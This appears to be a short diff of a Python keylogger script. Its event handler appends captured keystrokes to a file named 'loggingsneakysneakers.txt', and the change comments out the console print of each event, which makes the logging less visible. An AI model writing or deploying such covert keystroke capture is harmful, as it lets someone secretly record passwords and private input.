@@ -9,7 +9,7 @@ import sys
 def kbevent( event ):
     try:
         #print key info
-        print(event)
+        #print(event)
         butts = open("loggingsneakysneakers.txt", "a")
         butts.write(str(event))
         butts.close()
